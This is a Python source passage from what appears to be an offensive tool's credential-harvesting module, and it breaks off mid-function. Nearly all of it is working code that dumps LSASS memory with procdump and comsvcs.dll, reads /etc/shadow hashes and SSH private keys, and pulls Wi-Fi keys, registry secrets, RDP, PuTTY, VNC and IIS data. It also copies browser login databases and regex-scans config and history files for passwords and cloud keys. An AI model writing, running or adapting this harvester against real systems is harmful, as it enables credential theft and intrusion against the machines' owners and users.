"""
Credential Harvesting Module

Implements various credential harvesting techniques for Windows and Linux systems
including memory dumps, registry extraction, file searches, and browser data.
"""

import base64
import json
import logging
import os
import re
import sqlite3
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from ...utils.system.os_detection_mixin import OSDetectionMixin

logger = logging.getLogger(__name__)


class CredentialHarvester(OSDetectionMixin):
    """
    Cross-platform credential harvesting with multiple extraction methods.
    """

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.CredentialHarvester")

        # Harvesting techniques by platform
        self.harvesting_techniques = {
            'windows': {
                'lsass_dump': self._windows_lsass_dump,
                'registry_secrets': self._windows_registry_secrets,
                'cached_credentials': self._windows_cached_credentials,
                'browser_passwords': self._windows_browser_passwords,
                'wifi_passwords': self._windows_wifi_passwords,
                'rdp_credentials': self._windows_rdp_credentials,
                'iis_passwords': self._windows_iis_passwords,
                'sql_server_passwords': self._windows_sql_server_passwords,
                'vnc_passwords': self._windows_vnc_passwords,
                'putty_sessions': self._windows_putty_sessions,
                'firefox_passwords': self._windows_firefox_passwords,
                'chrome_passwords': self._windows_chrome_passwords
            },
            'linux': {
                'shadow_file': self._linux_shadow_file,
                'ssh_keys': self._linux_ssh_keys,
                'browser_passwords': self._linux_browser_passwords,
                'configuration_files': self._linux_configuration_files,
                'history_files': self._linux_history_files,
                'environment_variables': self._linux_environment_variables,
                'docker_credentials': self._linux_docker_credentials,
                'kubernetes_tokens': self._linux_kubernetes_tokens,
                'database_configs': self._linux_database_configs,
                'application_configs': self._linux_application_configs,
                'cloud_credentials': self._linux_cloud_credentials,
                'memory_dump': self._linux_memory_dump
            }
        }

        # Common credential patterns
        self.credential_patterns = {
            'passwords': [
                r'password["\s]*[:=]["\s]*([^"\s\n\r]+)',
                r'passwd["\s]*[:=]["\s]*([^"\s\n\r]+)',
                r'pwd["\s]*[:=]["\s]*([^"\s\n\r]+)',
                r'pass["\s]*[:=]["\s]*([^"\s\n\r]+)'
            ],
            'api_keys': [
                r'api[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9_\-]+)',
                r'access[_-]?token["\s]*[:=]["\s]*([a-zA-Z0-9_\-]+)',
                r'secret[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9_\-]+)'
            ],
            'database': [
                r'mysql://([^:]+):([^@]+)@([^/]+)/(\w+)',
                r'postgresql://([^:]+):([^@]+)@([^/]+)/(\w+)',
                r'mongodb://([^:]+):([^@]+)@([^/]+)/(\w+)'
            ],
            'cloud': [
                r'aws[_-]?access[_-]?key[_-]?id["\s]*[:=]["\s]*([A-Z0-9]{20})',
                r'aws[_-]?secret[_-]?access[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9/+=]{40})',
                r'azure[_-]?client[_-]?secret["\s]*[:=]["\s]*([a-zA-Z0-9\-_~.]{32,})',
                r'gcp[_-]?service[_-]?account[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9/+=]+)'
            ]
        }

        # Browser paths
        self.browser_paths = {
            'windows': {
                'chrome': r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data',
                'firefox': r'%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json',
                'edge': r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data',
                'ie': r'%LOCALAPPDATA%\Microsoft\Windows\WebCache\WebCacheV*.dat'
            },
            'linux': {
                'chrome': '~/.config/google-chrome/Default/Login Data',
                'firefox': '~/.mozilla/firefox/*.default/logins.json',
                'chromium': '~/.config/chromium/Default/Login Data'
            }
        }

        # Harvested credentials storage
        self.harvested_credentials = {}

    def harvest_credentials(self,
                           target_os: Optional[str] = None,
                           techniques: Optional[List[str]] = None,
                           output_format: str = 'dict') -> Dict[str, Any]:
        """
        Harvest credentials using specified techniques.
        
        Args:
            target_os: Target operating system ('windows', 'linux', or None for auto-detect)
            techniques: List of harvesting techniques to use
            output_format: Output format ('dict', 'json', 'csv')
            
        Returns:
            Harvested credentials and metadata
        """
        result = {
            'success': False,
            'target_os': target_os or self._detect_os(),
            'techniques_used': [],
            'credentials_found': 0,
            'credentials': {},
            'harvest_time': 0,
            'error': None
        }

        start_time = time.time()

        try:
            self.logger.info("Starting credential harvesting")

            os_type = result['target_os']

            if os_type not in self.harvesting_techniques:
                result['error'] = f"Unsupported OS: {os_type}"
                return result

            # Select techniques
            if techniques is None:
                techniques = list(self.harvesting_techniques[os_type].keys())

            # Execute each technique
            all_credentials = {}

            for technique in techniques:
                if technique in self.harvesting_techniques[os_type]:
                    self.logger.info(f"Running {technique}")
                    result['techniques_used'].append(technique)

                    try:
                        technique_func = self.harvesting_techniques[os_type][technique]
                        creds = technique_func()

                        if creds:
                            all_credentials[technique] = creds
                            self.logger.info(f"Found {len(creds)} credentials with {technique}")
                        else:
                            self.logger.debug(f"No credentials found with {technique}")

                    except Exception as e:
                        self.logger.warning(f"Technique {technique} failed: {e}")

            # Process and format results
            result['credentials'] = self._process_credentials(all_credentials, output_format)
            result['credentials_found'] = self._count_credentials(all_credentials)
            result['harvest_time'] = time.time() - start_time
            result['success'] = result['credentials_found'] > 0

            # Store results
            session_id = self._generate_session_id()
            self.harvested_credentials[session_id] = {
                'timestamp': time.time(),
                'target_os': os_type,
                'techniques': result['techniques_used'],
                'credentials': all_credentials
            }

            result['session_id'] = session_id

            self.logger.info(f"Credential harvesting complete: {result['credentials_found']} credentials found")
            return result

        except Exception as e:
            self.logger.error(f"Credential harvesting failed: {e}")
            result['error'] = str(e)
            result['harvest_time'] = time.time() - start_time
            return result

    def search_files_for_credentials(self,
                                   search_paths: List[str],
                                   file_patterns: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Search files for credential patterns.
        
        Args:
            search_paths: List of directories to search
            file_patterns: File patterns to include in search
            
        Returns:
            Found credentials from file search
        """
        result = {
            'success': False,
            'files_searched': 0,
            'credentials_found': 0,
            'credentials': {},
            'error': None
        }

        if file_patterns is None:
            file_patterns = ['*.txt', '*.cfg', '*.conf', '*.ini', '*.xml', '*.json', '*.env']

        try:
            self.logger.info(f"Searching files in {len(search_paths)} paths")

            credentials = {}
            files_searched = 0

            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue

                for pattern in file_patterns:
                    # Find matching files
                    files = list(Path(search_path).rglob(pattern))

                    for file_path in files:
                        try:
                            if file_path.is_file() and file_path.stat().st_size < 10 * 1024 * 1024:  # Max 10MB
                                files_searched += 1
                                file_creds = self._extract_credentials_from_file(str(file_path))

                                if file_creds:
                                    credentials[str(file_path)] = file_creds

                        except Exception as e:
                            self.logger.debug(f"Error reading {file_path}: {e}")

            result['files_searched'] = files_searched
            result['credentials'] = credentials
            result['credentials_found'] = sum(len(creds) for creds in credentials.values())
            result['success'] = result['credentials_found'] > 0

            self.logger.info(f"File search complete: {result['credentials_found']} credentials in {files_searched} files")
            return result

        except Exception as e:
            self.logger.error(f"File search failed: {e}")
            result['error'] = str(e)
            return result

    def extract_credentials_from_memory(self,
                                      process_name: Optional[str] = None,
                                      dump_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Extract credentials from memory dumps.
        
        Args:
            process_name: Target process name
            dump_path: Path to existing memory dump
            
        Returns:
            Extracted credentials from memory
        """
        result = {
            'success': False,
            'dump_created': False,
            'credentials_found': 0,
            'credentials': {},
            'error': None
        }

        try:
            self.logger.info("Extracting credentials from memory")

            # Create memory dump if not provided
            if not dump_path:
                from ...utils.system.os_detection import is_windows
                if is_windows():
                    dump_path = self._create_windows_memory_dump(process_name or 'lsass.exe')
                else:
                    dump_path = self._create_linux_memory_dump(process_name)

                result['dump_created'] = True

            if not dump_path or not os.path.exists(dump_path):
                result['error'] = "Failed to create or locate memory dump"
                return result

            # Extract credentials from dump
            credentials = self._parse_memory_dump(dump_path)

            result['credentials'] = credentials
            result['credentials_found'] = sum(len(creds) for creds in credentials.values())
            result['success'] = result['credentials_found'] > 0

            # Cleanup dump if we created it
            if result['dump_created'] and os.path.exists(dump_path):
                try:
                    os.remove(dump_path)
                except Exception:
                    pass

            self.logger.info(f"Memory extraction complete: {result['credentials_found']} credentials found")
            return result

        except Exception as e:
            self.logger.error(f"Memory credential extraction failed: {e}")
            result['error'] = str(e)
            return result

    # Windows harvesting techniques

    def _windows_lsass_dump(self) -> Dict[str, Any]:
        """Dump LSASS process memory for credentials."""
        credentials = {}

        try:
            # Create LSASS dump using different methods
            dump_methods = [
                'procdump -ma lsass.exe lsass.dmp',
                'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump',
                'tasklist /fi "imagename eq lsass.exe"'
            ]

            for method in dump_methods:
                try:
                    result = subprocess.run(method, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        # Would parse dump with pypykatz or similar
                        credentials['lsass_dump'] = {
                            'method': method,
                            'status': 'success',
                            'note': 'Use pypykatz or Mimikatz to parse dump'
                        }
                        break
                except Exception:
                    continue

        except Exception as e:
            self.logger.debug(f"LSASS dump failed: {e}")

        return credentials

    def _windows_registry_secrets(self) -> Dict[str, Any]:
        """Extract secrets from Windows registry."""
        credentials = {}

        try:
            # Registry locations with potential secrets
            registry_keys = [
                r'HKLM\SYSTEM\CurrentControlSet\Services',
                r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
                r'HKCU\Software\Microsoft\Terminal Server Client\Servers',
                r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            ]

            for key in registry_keys:
                try:
                    cmd = f'reg query "{key}" /s 2>nul'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                    if result.returncode == 0:
                        # Extract potential credentials from registry output
                        reg_creds = self._extract_credentials_from_text(result.stdout)
                        if reg_creds:
                            key_name = key.split("\\")[-1]
                            credentials[f'registry_{key_name}'] = reg_creds

                except Exception:
                    continue

        except Exception as e:
            self.logger.debug(f"Registry secrets extraction failed: {e}")

        return credentials

    def _windows_cached_credentials(self) -> Dict[str, Any]:
        """Extract cached domain credentials."""
        credentials = {}

        try:
            # Check for cached credentials
            cmd = 'cmdkey /list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                cached_creds = []
                lines = result.stdout.split('\n')

                for line in lines:
                    if 'Target:' in line:
                        target = line.split('Target:')[1].strip()
                        cached_creds.append({'target': target, 'type': 'cached'})

                if cached_creds:
                    credentials['cached_credentials'] = cached_creds

        except Exception as e:
            self.logger.debug(f"Cached credentials extraction failed: {e}")

        return credentials

    def _windows_browser_passwords(self) -> Dict[str, Any]:
        """Extract passwords from Windows browsers."""
        credentials = {}

        try:
            for browser, db_path in self.browser_paths['windows'].items():
                try:
                    expanded_path = os.path.expandvars(db_path)

                    if '*' in expanded_path:
                        # Handle wildcard paths
                        import glob
                        matching_paths = glob.glob(expanded_path)
                        for path in matching_paths:
                            browser_creds = self._extract_browser_credentials(path, browser)
                            if browser_creds:
                                credentials[f'{browser}_{os.path.basename(path)}'] = browser_creds
                    else:
                        if os.path.exists(expanded_path):
                            browser_creds = self._extract_browser_credentials(expanded_path, browser)
                            if browser_creds:
                                credentials[browser] = browser_creds

                except Exception as e:
                    self.logger.debug(f"Browser {browser} extraction failed: {e}")

        except Exception as e:
            self.logger.debug(f"Browser password extraction failed: {e}")

        return credentials

    def _windows_wifi_passwords(self) -> Dict[str, Any]:
        """Extract WiFi passwords."""
        credentials = {}

        try:
            # Get WiFi profiles
            cmd = 'netsh wlan show profiles'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                wifi_creds = []

                # Extract profile names
                for line in result.stdout.split('\n'):
                    if 'All User Profile' in line:
                        profile_name = line.split(':')[1].strip()

                        # Get password for profile
                        pwd_cmd = f'netsh wlan show profile name="{profile_name}" key=clear'
                        pwd_result = subprocess.run(pwd_cmd, shell=True, capture_output=True, text=True)

                        if pwd_result.returncode == 0:
                            for pwd_line in pwd_result.stdout.split('\n'):
                                if 'Key Content' in pwd_line:
                                    password = pwd_line.split(':')[1].strip()
                                    wifi_creds.append({
                                        'ssid': profile_name,
                                        'password': password,
                                        'type': 'wifi'
                                    })
                                    break

                if wifi_creds:
                    credentials['wifi_passwords'] = wifi_creds

        except Exception as e:
            self.logger.debug(f"WiFi password extraction failed: {e}")

        return credentials

    # Additional Windows technique stubs

    def _windows_rdp_credentials(self) -> Dict[str, Any]:
        """Extract RDP credentials from Windows registry."""
        credentials = {'rdp_credentials': []}

        try:
            import winreg

            # RDP saved connections in registry
            rdp_paths = [
                r"Software\Microsoft\Terminal Server Client\Default",
                r"Software\Microsoft\Terminal Server Client\Servers"
            ]

            for path in rdp_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
                        i = 0
                        while True:
                            try:
                                server_name = winreg.EnumKey(key, i)
                                server_path = f"{path}\\{server_name}"

                                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, server_path) as server_key:
                                    server_data = {}
                                    j = 0
                                    while True:
                                        try:
                                            value_name, value_data, _ = winreg.EnumValue(server_key, j)
                                            server_data[value_name] = value_data
                                            j += 1
                                        except OSError:
                                            break

                                    if server_data:
                                        credentials['rdp_credentials'].append({
                                            'server': server_name,
                                            'data': server_data,
                                            'source': 'registry'
                                        })
                                i += 1
                            except OSError:
                                break

                except FileNotFoundError:
                    continue

        except ImportError:
            self.logger.warning("winreg module not available for RDP credential extraction")
        except Exception as e:
            self.logger.error(f"Error extracting RDP credentials: {e}")

        return credentials

    def _windows_iis_passwords(self) -> Dict[str, Any]:
        """Extract IIS application pool and site passwords."""
        credentials = {'iis_passwords': []}

        try:
            # IIS configuration locations
            config_paths = [
                r"C:\Windows\System32\inetsrv\config\applicationHost.config",
                r"C:\inetpub\wwwroot\web.config"
            ]

            for config_path in config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, 'r', encoding='utf-8') as f:
                            content = f.read()

                        # Extract connection strings and app pool credentials
                        import xml.etree.ElementTree as ET
                        root = ET.fromstring(content)

                        # Find application pool identities
                        for app_pool in root.findall('.//applicationPool'):
                            identity = app_pool.find('.//processModel')
                            if identity is not None:
                                username = identity.get('userName')
                                password = identity.get('password')
                                if username and password:
                                    credentials['iis_passwords'].append({
                                        'type': 'application_pool',
                                        'pool_name': app_pool.get('name'),
                                        'username': username,
                                        'password': password,
                                        'source': config_path
                                    })

                        # Find connection strings
                        for conn_str in root.findall('.//connectionStrings/add'):
                            conn_string = conn_str.get('connectionString', '')
                            if 'password=' in conn_string.lower():
                                credentials['iis_passwords'].append({
                                    'type': 'connection_string',
                                    'name': conn_str.get('name'),
                                    'connection_string': conn_string,
                                    'source': config_path
                                })

                    except Exception as e:
                        self.logger.debug(f"Error parsing IIS config {config_path}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting IIS passwords: {e}")

        return credentials

    def _windows_sql_server_passwords(self) -> Dict[str, Any]:
        """Extract SQL Server connection strings and service accounts."""
        credentials = {'sql_server_passwords': []}

        try:
            import winreg

            # SQL Server registry locations
            sql_paths = [
                r"SOFTWARE\Microsoft\Microsoft SQL Server",
                r"SOFTWARE\WOW6432Node\Microsoft\Microsoft SQL Server"
            ]

            for base_path in sql_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base_path) as key:
                        # Get instance names
                        try:
                            instances_key = winreg.OpenKey(key, "Instance Names\\SQL")
                            i = 0
                            while True:
                                try:
                                    instance_name, instance_id, _ = winreg.EnumValue(instances_key, i)

                                    # Get service account for this instance
                                    service_path = f"{base_path}\\{instance_id}\\MSSQLServer\\Parameters"
                                    try:
                                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, service_path) as svc_key:
                                            j = 0
                                            service_data = {}
                                            while True:
                                                try:
                                                    val_name, val_data, _ = winreg.EnumValue(svc_key, j)
                                                    service_data[val_name] = val_data
                                                    j += 1
                                                except OSError:
                                                    break

                                            if service_data:
                                                credentials['sql_server_passwords'].append({
                                                    'instance': instance_name,
                                                    'instance_id': instance_id,
                                                    'service_data': service_data,
                                                    'source': 'registry'
                                                })
                                    except FileNotFoundError:
                                        pass

                                    i += 1
                                except OSError:
                                    break
                        except FileNotFoundError:
                            pass

                except FileNotFoundError:
                    continue

            # Search for SQL connection strings in common locations
            config_locations = [
                r"C:\inetpub\wwwroot\web.config",
                r"C:\Program Files\Microsoft SQL Server\*\Tools\Binn\*.config"
            ]

            for location in config_locations:
                if '*' in location:
                    import glob
                    files = glob.glob(location)
                else:
                    files = [location] if os.path.exists(location) else []

                for file_path in files:
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()

                        # Extract SQL connection strings
                        sql_patterns = [
                            r'Data Source=([^;]+);.*User ID=([^;]+);.*Password=([^;]+)',
                            r'Server=([^;]+);.*User Id=([^;]+);.*Password=([^;]+)',
                            r'server=([^;]+);.*uid=([^;]+);.*pwd=([^;]+)'
                        ]

                        for pattern in sql_patterns:
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            for match in matches:
                                credentials['sql_server_passwords'].append({
                                    'server': match.group(1),
                                    'username': match.group(2),
                                    'password': match.group(3),
                                    'source': file_path,
                                    'type': 'connection_string'
                                })

                    except Exception as e:
                        self.logger.debug(f"Error parsing SQL config {file_path}: {e}")

        except ImportError:
            self.logger.warning("winreg module not available for SQL Server credential extraction")
        except Exception as e:
            self.logger.error(f"Error extracting SQL Server passwords: {e}")

        return credentials

    def _windows_vnc_passwords(self) -> Dict[str, Any]:
        """Extract VNC passwords from registry and configuration files."""
        credentials = {'vnc_passwords': []}

        try:
            import winreg

            # VNC registry locations
            vnc_paths = [
                r"SOFTWARE\ORL\WinVNC3\Default",
                r"SOFTWARE\RealVNC\WinVNC4",
                r"SOFTWARE\TightVNC\Server",
                r"SOFTWARE\UltraVNC"
            ]

            for path in vnc_paths:
                for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        with winreg.OpenKey(hive, path) as key:
                            i = 0
                            vnc_data = {}
                            while True:
                                try:
                                    val_name, val_data, val_type = winreg.EnumValue(key, i)
                                    if 'password' in val_name.lower():
                                        vnc_data[val_name] = val_data
                                    i += 1
                                except OSError:
                                    break

                            if vnc_data:
                                credentials['vnc_passwords'].append({
                                    'registry_path': path,
                                    'hive': 'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU',
                                    'password_data': vnc_data,
                                    'source': 'registry'
                                })

                    except FileNotFoundError:
                        continue

            # VNC configuration files
            vnc_config_paths = [
                r"C:\Program Files\RealVNC\VNC4\winvnc4.exe",
                r"C:\Program Files\TightVNC\tvnserver.exe",
                r"C:\Program Files\UltraVNC\ultravnc.ini"
            ]

            for config_path in vnc_config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, 'rb') as f:
                            content = f.read()

                        # Look for encrypted password patterns
                        password_patterns = [
                            b'Password=',
                            b'passwd=',
                            b'ViewOnlyPassword='
                        ]

                        for pattern in password_patterns:
                            if pattern in content:
                                # Extract the encrypted password bytes
                                start = content.find(pattern) + len(pattern)
                                # VNC passwords are typically 8 bytes when encrypted
                                password_bytes = content[start:start+8]

                                credentials['vnc_passwords'].append({
                                    'config_file': config_path,
                                    'encrypted_password': password_bytes.hex(),
                                    'source': 'config_file',
                                    'note': 'Password is DES encrypted - requires decryption'
                                })

                    except Exception as e:
                        self.logger.debug(f"Error reading VNC config {config_path}: {e}")

        except ImportError:
            self.logger.warning("winreg module not available for VNC credential extraction")
        except Exception as e:
            self.logger.error(f"Error extracting VNC passwords: {e}")

        return credentials

    def _windows_putty_sessions(self) -> Dict[str, Any]:
        """Extract PuTTY saved session data including passwords."""
        credentials = {'putty_sessions': []}

        try:
            import winreg

            # PuTTY session registry location
            putty_path = r"SOFTWARE\SimonTatham\PuTTY\Sessions"

            for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                try:
                    with winreg.OpenKey(hive, putty_path) as sessions_key:
                        i = 0
                        while True:
                            try:
                                session_name = winreg.EnumKey(sessions_key, i)
                                session_path = f"{putty_path}\\{session_name}"

                                with winreg.OpenKey(hive, session_path) as session_key:
                                    session_data = {}
                                    j = 0
                                    while True:
                                        try:
                                            val_name, val_data, _ = winreg.EnumValue(session_key, j)
                                            session_data[val_name] = val_data
                                            j += 1
                                        except OSError:
                                            break

                                    # Extract useful connection info
                                    session_info = {
                                        'session_name': session_name.replace('%20', ' '),
                                        'hostname': session_data.get('HostName', ''),
                                        'username': session_data.get('UserName', ''),
                                        'port': session_data.get('PortNumber', 22),
                                        'protocol': session_data.get('Protocol', 'ssh'),
                                        'proxy_host': session_data.get('ProxyHost', ''),
                                        'proxy_username': session_data.get('ProxyUsername', ''),
                                        'public_key_file': session_data.get('PublicKeyFile', ''),
                                        'source': f"registry_{hive}",
                                        'full_data': session_data
                                    }

                                    if session_info['hostname']:
                                        credentials['putty_sessions'].append(session_info)

                                i += 1
                            except OSError:
                                break

                except FileNotFoundError:
                    continue

            # Also check for PuTTY configuration files
            putty_config_paths = [
                os.path.expanduser("~/.putty/sessions"),
                os.path.expanduser("~/Documents/putty.reg")
            ]

            for config_path in putty_config_paths:
                if os.path.exists(config_path):
                    try:
                        if os.path.isdir(config_path):
                            # Unix-style session directory
                            for session_file in os.listdir(config_path):
                                session_path = os.path.join(config_path, session_file)
                                with open(session_path, 'r') as f:
                                    content = f.read()

                                # Parse session data
                                session_data = {}
                                for line in content.split('\n'):
                                    if '=' in line:
                                        key, value = line.split('=', 1)
                                        session_data[key.strip()] = value.strip()

                                if session_data:
                                    credentials['putty_sessions'].append({
                                        'session_name': session_file,
                                        'source': 'unix_config',
                                        'data': session_data
                                    })
                        else:
                            # Registry export file
                            with open(config_path, 'r') as f:
                                content = f.read()

                            # Parse registry export format
                            import re
                            sessions = re.findall(r'\[.*\\Sessions\\([^\]]+)\]', content)
                            for session in sessions:
                                credentials['putty_sessions'].append({
                                    'session_name': session,
                                    'source': 'registry_export',
                                    'file': config_path
                                })

                    except Exception as e:
                        self.logger.debug(f"Error reading PuTTY config {config_path}: {e}")

        except ImportError:
            self.logger.warning("winreg module not available for PuTTY session extraction")
        except Exception as e:
            self.logger.error(f"Error extracting PuTTY sessions: {e}")

        return credentials

    def _windows_firefox_passwords(self) -> Dict[str, Any]:
        """Extract Firefox saved passwords from profile directories."""
        credentials = {'firefox_passwords': []}

        try:
            firefox_paths = [
                os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
                os.path.expanduser("~/.mozilla/firefox")
            ]

            for firefox_path in firefox_paths:
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        profile_path = os.path.join(firefox_path, profile)
                        if os.path.isdir(profile_path):
                            logins_file = os.path.join(profile_path, "logins.json")
                            if os.path.exists(logins_file):
                                try:
                                    with open(logins_file, 'r', encoding='utf-8') as f:
                                        logins_data = json.load(f)

                                    for login in logins_data.get('logins', []):
                                        credentials['firefox_passwords'].append({
                                            'hostname': login.get('hostname', ''),
                                            'username': login.get('encryptedUsername', ''),
                                            'password': login.get('encryptedPassword', ''),
                                            'profile': profile,
                                            'source': 'firefox_profile',
                                            'note': 'Passwords are encrypted - requires master password'
                                        })

                                except Exception as e:
                                    self.logger.debug(f"Error reading Firefox logins {logins_file}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting Firefox passwords: {e}")

        return credentials

    def _windows_chrome_passwords(self) -> Dict[str, Any]:
        """Extract Chrome saved passwords from profile directories."""
        credentials = {'chrome_passwords': []}

        try:
            chrome_paths = [
                os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
                os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
                os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
            ]

            for login_data_path in chrome_paths:
                if os.path.exists(login_data_path):
                    try:
                        # Copy the database to avoid locking issues
                        import shutil
                        import tempfile

                        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                            shutil.copy2(login_data_path, temp_file.name)
                            temp_db_path = temp_file.name

                        # Read from the temporary copy
                        conn = sqlite3.connect(temp_db_path)
                        cursor = conn.cursor()

                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        results = cursor.fetchall()

                        for row in results:
                            url, username, encrypted_password = row
                            credentials['chrome_passwords'].append({
                                'url': url,
                                'username': username,
                                'encrypted_password': base64.b64encode(encrypted_password).decode() if encrypted_password else '',
                                'source': 'chrome_profile',
                                'database_path': login_data_path,
                                'note': 'Password is DPAPI encrypted'
                            })

                        conn.close()
                        os.unlink(temp_db_path)

                    except Exception as e:
                        self.logger.debug(f"Error reading Chrome database {login_data_path}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting Chrome passwords: {e}")

        return credentials

    # Linux harvesting techniques

    def _linux_shadow_file(self) -> Dict[str, Any]:
        """Extract password hashes from shadow file."""
        credentials = {}

        try:
            shadow_path = '/etc/shadow'

            if os.path.exists(shadow_path) and os.access(shadow_path, os.R_OK):
                with open(shadow_path, 'r') as f:
                    shadow_entries = []

                    for line in f:
                        if line.strip() and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 2:
                                username = parts[0]
                                password_hash = parts[1]

                                if password_hash and password_hash != '*' and password_hash != '!':
                                    shadow_entries.append({
                                        'username': username,
                                        'hash': password_hash,
                                        'type': 'shadow_hash'
                                    })

                    if shadow_entries:
                        credentials['shadow_hashes'] = shadow_entries

        except Exception as e:
            self.logger.debug(f"Shadow file extraction failed: {e}")

        return credentials

    def _linux_ssh_keys(self) -> Dict[str, Any]:
        """Extract SSH private keys."""
        credentials = {}

        try:
            ssh_paths = [
                '~/.ssh/',
                '/root/.ssh/',
                '/home/*/.ssh/'
            ]

            ssh_keys = []

            for ssh_path in ssh_paths:
                expanded_path = os.path.expanduser(ssh_path)

                if '*' in expanded_path:
                    import glob
                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path) and os.path.isdir(path):
                        for filename in os.listdir(path):
                            if filename.startswith('id_') and not filename.endswith('.pub'):
                                key_path = os.path.join(path, filename)

                                try:
                                    with open(key_path, 'r') as f:
                                        key_content = f.read()

                                        if 'PRIVATE KEY' in key_content:
                                            ssh_keys.append({
                                                'path': key_path,
                                                'type': 'ssh_private_key',
                                                'algorithm': filename.split('_')[1] if '_' in filename else 'unknown'
                                            })

                                except Exception:
                                    continue

            if ssh_keys:
                credentials['ssh_private_keys'] = ssh_keys

        except Exception as e:
            self.logger.debug(f"SSH key extraction failed: {e}")

        return credentials

    def _linux_browser_passwords(self) -> Dict[str, Any]:
        """Extract passwords from Linux browsers."""
        credentials = {}

        try:
            for browser, db_path in self.browser_paths['linux'].items():
                try:
                    expanded_path = os.path.expanduser(db_path)

                    if '*' in expanded_path:
                        import glob
                        matching_paths = glob.glob(expanded_path)
                        for path in matching_paths:
                            browser_creds = self._extract_browser_credentials(path, browser)
                            if browser_creds:
                                credentials[f'{browser}_{os.path.basename(path)}'] = browser_creds
                    else:
                        if os.path.exists(expanded_path):
                            browser_creds = self._extract_browser_credentials(expanded_path, browser)
                            if browser_creds:
                                credentials[browser] = browser_creds

                except Exception as e:
                    self.logger.debug(f"Browser {browser} extraction failed: {e}")

        except Exception as e:
            self.logger.debug(f"Linux browser password extraction failed: {e}")

        return credentials
    def _linux_configuration_files(self) -> Dict[str, Any]:
        """Search configuration files for credentials."""
        credentials = {}

        try:
            config_paths = [
                '/etc/',
                '/usr/local/etc/',
                '~/.config/',
                '/opt/*/conf/',
                '/var/lib/*/conf/'
            ]

            config_files = []

            for config_path in config_paths:
                expanded_path = os.path.expanduser(config_path)

                if '*' in expanded_path:
                    import glob
                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path) and os.path.isdir(path):
                        try:
                            for root, dirs, files in os.walk(path):
                                for file in files:
                                    if any(ext in file.lower() for ext in ['.conf', '.cfg', '.ini', '.env']):
                                        file_path = os.path.join(root, file)
                                        file_creds = self._extract_credentials_from_file(file_path)

                                        if file_creds:
                                            config_files.append({
                                                'file': file_path,
                                                'credentials': file_creds
                                            })

                        except Exception:
                            continue

            if config_files:
                credentials['configuration_files'] = config_files

        except Exception as e:
            self.logger.debug(f"Configuration file extraction failed: {e}")

        return credentials

    def _linux_history_files(self) -> Dict[str, Any]:
        """Extract credentials from shell history files."""
        credentials = {}

        try:
            history_files = [
                '~/.bash_history',
                '~/.zsh_history',
                '~/.fish_history',
                '/root/.bash_history',
                '/home/*/.bash_history'
            ]

            history_creds = []

            for history_file in history_files:
                expanded_path = os.path.expanduser(history_file)

                if '*' in expanded_path:
                    import glob
                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path):
                        try:
                            with open(path, 'r') as f:
                                for line_num, line in enumerate(f, 1):
                                    # Look for commands with potential credentials
                                    if any(keyword in line.lower() for keyword in ['password', 'passwd', 'mysql', 'psql', 'ssh']):
                                        creds = self._extract_credentials_from_text(line)
                                        if creds:
                                            history_creds.append({
                                                'file': path,
                                                'line': line_num,
                                                'command': line.strip(),
                                                'credentials': creds
                                            })

                        except Exception:
                            continue

            if history_creds:
                credentials['shell_history'] = history_creds

        except Exception as e:
            self.logger.debug(f"History file extraction failed: {e}")

        return credentials

    def _linux_environment_variables(self) -> Dict[str, Any]:
        """Extract credentials from environment variables."""
        credentials = {}

        try:
            env_creds = []

            # Check current environment
            for key, value in os.environ.items():
